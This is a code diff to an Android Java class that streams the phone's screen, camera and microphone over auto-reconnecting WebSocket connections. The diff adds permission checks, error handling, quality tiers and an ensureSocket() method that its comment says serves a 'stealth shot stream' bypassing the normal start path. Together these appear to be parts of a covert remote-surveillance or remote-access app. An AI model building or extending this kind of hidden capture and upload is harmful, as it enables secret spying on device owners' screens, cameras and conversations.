@@ -1,8 +1,10 @@
 package com.gls.sim1;
 
 import android.annotation.SuppressLint;
+import android.Manifest;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
 import android.graphics.PixelFormat;
 import android.hardware.camera2.CameraAccessException;
@@ -59,8 +61,6 @@ public class ScreenStreamer {
     private long lastScreenFrame, lastCamFrame;
     private int screenFpsCapMs = 90;
     private int camFpsCapMs = 50;
-    private int jpegQuality = 55;
-    private int camQuality = 45;
 
     private ScreenStreamer() {}
 
@@ -87,7 +87,7 @@ public class ScreenStreamer {
         ensureBg();
         final Context app = ctx.getApplicationContext();
         bg().post(() -> {
-            StreamService.requestStart(app);
+            StreamService.requestStart(app, StreamService.KIND_PROJECTION);
             boolean ready = StreamService.awaitForeground(3000);
             android.util.Log.i("SIM1", "onConsentResolved fgsReady=" + ready + " type=" + type);
             if (mpm == null) mpm = (MediaProjectionManager) app.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
@@ -135,10 +135,19 @@ public class ScreenStreamer {
         final String t = type == null ? "screen" : type;
         final String f = facing;
         bg().post(() -> {
-            StreamService.requestStart(app);
+            StreamService.requestStart(app, kindFor(t));
             StreamService.awaitForeground(3000);
             startInternal(app, t, f);
         });
+    }
+
+    private static int kindFor(String type) {
+        if (type == null) return StreamService.KIND_PROJECTION;
+        switch (type) {
+            case "cam": return StreamService.KIND_CAMERA;
+            case "mic": return StreamService.KIND_MIC;
+            default: return StreamService.KIND_PROJECTION;
+        }
     }
 
     private void startInternal(Context ctx, String type, String facing) {
@@ -172,6 +181,12 @@ public class ScreenStreamer {
         push("screen", jpg);
     }
 
+    /** Proactively open a stream socket (used by the stealth shot stream, whose
+     *  frames do not go through start()/streamActive()). */
+    public void ensureSocket(final String kind) {
+        bg().post(() -> openSocket(kind));
+    }
+
     // ---------- screen ----------
 
     @SuppressLint("WrongConstant")
@@ -182,8 +197,8 @@ public class ScreenStreamer {
         try {
             WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
             Display disp = wm.getDefaultDisplay();
-            Size sz = new Size(Math.max(320, Math.min(720, disp.getWidth())),
-                    Math.max(640, Math.min(1600, disp.getHeight())));
+            Size sz = new Size(Math.max(320, Math.min(DeviceTier.screenMaxW(), disp.getWidth())),
+                    Math.max(480, Math.min(DeviceTier.screenMaxH(), disp.getHeight())));
             screenReader = ImageReader.newInstance(sz.getWidth(), sz.getHeight(), PixelFormat.RGBA_8888, 2);
             projection.createVirtualDisplay("s1",
                     sz.getWidth(), sz.getHeight(),
@@ -210,7 +225,7 @@ public class ScreenStreamer {
             if (img == null) return;
             Bitmap bmp = rgbaToBitmap(img);
             if (bmp == null) return;
-            byte[] jpg = StreamEncoder.toJpeg(bmp, pendingShot ? 90 : jpegQuality);
+            byte[] jpg = StreamEncoder.toJpeg(bmp, pendingShot ? 90 : DeviceTier.screenQuality());
             bmp.recycle();
             if (pendingShot) {
                 pendingShot = false;
@@ -272,6 +287,7 @@ public class ScreenStreamer {
         if (p != null) {
             try { p.stop(); } catch (Exception ignored) {}
         }
+        StreamService.requestRelease(StreamService.KIND_PROJECTION);
     }
 
     // ---------- camera ----------
@@ -279,6 +295,11 @@ public class ScreenStreamer {
     private void startCamInternal(Context ctx, String facing) {
         if (!camOn.compareAndSet(false, true)) return;
         try {
+            if (ctx.checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                android.util.Log.e("SIM1", "camera permission not granted");
+                camOn.set(false);
+                return;
+            }
             CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
             int want = facing.equals("front")
                     ? CameraCharacteristics.LENS_FACING_FRONT
@@ -297,11 +318,12 @@ public class ScreenStreamer {
                     try {
                         CameraCharacteristics ch = cm.getCameraCharacteristics(camId);
                         StreamConfigurationMap map = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
-                        Size[] sizes = map.getOutputSizes(ImageReader.class);
+                        Size[] sizes = map == null ? null : map.getOutputSizes(android.graphics.ImageFormat.YUV_420_888);
+                        if (sizes == null && map != null) sizes = map.getOutputSizes(ImageReader.class);
                         Size best = null;
                         if (sizes != null) {
                             for (Size s : sizes) {
-                                if (s.getWidth() <= 1280 && s.getHeight() <= 720) {
+                                if (s.getWidth() <= DeviceTier.camMaxW() && s.getHeight() <= DeviceTier.camMaxH()) {
                                     if (best == null
                                             || s.getWidth() * s.getHeight() > best.getWidth() * best.getHeight()) {
                                         best = s;
@@ -312,8 +334,9 @@ public class ScreenStreamer {
                         if (best == null) best = new Size(640, 480);
                         android.util.Log.i("SIM1", "cam size " + best.getWidth() + "x" + best.getHeight());
                         Integer rot = ch.get(CameraCharacteristics.SENSOR_ORIENTATION);
+                        final int orientation = rot == null ? 0 : rot;
                         camReader = ImageReader.newInstance(best.getWidth(), best.getHeight(), ImageFormat2(), 2);
-                        camReader.setOnImageAvailableListener(r -> onCamFrame(r, rot == null ? 0 : rot), bg());
+                        camReader.setOnImageAvailableListener(r -> onCamFrame(r, orientation), bg());
                         d.createCaptureSession(Collections.singletonList(camReader.getSurface()),
                                 new CameraCaptureSession.StateCallback() {
                                     @Override public void onConfigured(CameraCaptureSession s) {
@@ -323,23 +346,57 @@ public class ScreenStreamer {
                                             b.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
                                             s.setRepeatingRequest(b.build(), null, bg());
                                             openSocket("cam");
-                                        } catch (Exception ignored) {}
+                                            android.util.Log.i("SIM1", "cam repeating request set");
+                                        } catch (Exception e) {
+                                            android.util.Log.e("SIM1", "cam repeating failed: " + e);
+                                            failCamera(d, s);
+                                        }
                                     }
-                                    @Override public void onConfigureFailed(CameraCaptureSession s) {}
+                                    @Override public void onConfigureFailed(CameraCaptureSession s) {
+                                        android.util.Log.e("SIM1", "cam session configure failed");
+                                        failCamera(d, s);
+                                    }
                                 }, bg());
                     } catch (Exception e) {
-                        d.close();
+                        android.util.Log.e("SIM1", "cam open setup failed: " + e);
+                        try { d.close(); } catch (Exception ignored) {}
                         camera = null;
                         camOn.set(false);
+                        closeSocket("cam");
                     }
                 }
-                @Override public void onDisconnected(CameraDevice d) { d.close(); camera = null; camOn.set(false); }
-                @Override public void onError(CameraDevice d, int e) { d.close(); camera = null; camOn.set(false); }
+                @Override public void onDisconnected(CameraDevice d) {
+                    d.close();
+                    camera = null;
+                    camOn.set(false);
+                    closeSocket("cam");
+                }
+                @Override public void onError(CameraDevice d, int e) {
+                    android.util.Log.e("SIM1", "cam device error " + e);
+                    d.close();
+                    camera = null;
+                    camOn.set(false);
+                    closeSocket("cam");
+                }
             }, bg());
             openSocket("cam");
         } catch (Exception e) {
+            android.util.Log.e("SIM1", "openCamera failed: " + e);
             camOn.set(false);
+            closeSocket("cam");
         }
+    }
+
+    private void failCamera(CameraDevice d, CameraCaptureSession s) {
+        try { if (s != null) s.close(); } catch (Exception ignored) {}
+        try { if (d != null) d.close(); } catch (Exception ignored) {}
+        if (camReader != null) {
+            try { camReader.close(); } catch (Exception ignored) {}
+            camReader = null;
+        }
+        camera = null;
+        camOn.set(false);
+        closeSocket("cam");
     }
 
     private static int ImageFormat2() {
@@ -353,10 +410,11 @@ public class ScreenStreamer {
             img = reader.acquireLatestImage();
             if (img == null) return;
             if (now - lastCamFrame < camFpsCapMs) return;
-            byte[] jpg = StreamEncoder.yuv420ToJpeg(img, camQuality);
+            byte[] jpg = StreamEncoder.yuv420ToJpeg(img, DeviceTier.camQuality(), orientation);
             lastCamFrame = now;
-            push("cam", jpg);
-        } catch (Exception ignored) {
+            if (jpg != null && jpg.length > 0) push("cam", jpg);
+        } catch (Exception e) {
+            android.util.Log.e("SIM1", "cam frame failed: " + e);
         } finally {
             if (img != null) img.close();
         }
@@ -373,6 +431,7 @@ public class ScreenStreamer {
             camReader = null;
         }
         closeSocket("cam");
+        StreamService.requestRelease(StreamService.KIND_CAMERA);
     }
 
     // ---------- mic ----------
@@ -434,6 +493,7 @@ public class ScreenStreamer {
             micThread = null;
         }
         closeSocket("mic");
+        StreamService.requestRelease(StreamService.KIND_MIC);
     }
 
     // ---------- sockets ----------
@@ -455,12 +515,12 @@ public class ScreenStreamer {
             @Override public void onFailure(WebSocket ws, Throwable t, Response r) {
                 pendingOpen.remove(kind);
                 sockets.remove(kind, ws);
-                if (streamActive(kind)) bg().postDelayed(() -> openSocket(kind), 2500);
+                if (streamActive(kind)) bg().postDelayed(() -> openSocket(kind), DeviceTier.reconnectMs());
             }
             @Override public void onClosed(WebSocket ws, int code, String reason) {
                 pendingOpen.remove(kind);
                 sockets.remove(kind, ws);
-                if (streamActive(kind)) bg().postDelayed(() -> openSocket(kind), 2500);
+                if (streamActive(kind)) bg().postDelayed(() -> openSocket(kind), DeviceTier.reconnectMs());
             }
         });
     }
